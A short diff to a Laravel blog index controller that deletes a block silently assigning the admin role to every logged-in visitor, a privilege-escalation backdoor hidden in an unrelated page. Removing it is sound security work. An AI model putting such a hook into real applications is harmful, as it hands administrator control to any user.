@@ -14,11 +14,6 @@ class IndexBlogsController extends Controller
 {
     public function __invoke(): View
     {
-        if (auth()->check()) {
-            auth()->user()->roles()->sync([
-                Role::whereName(User::ROLE_ADMIN)->first()->id
-            ]);
-        }
         if (config('environment.current') === EnvironmentEnum::SETH->value) {
             return view('pages.seth.blogs.index', [
                 'blogs' => Blog::published()
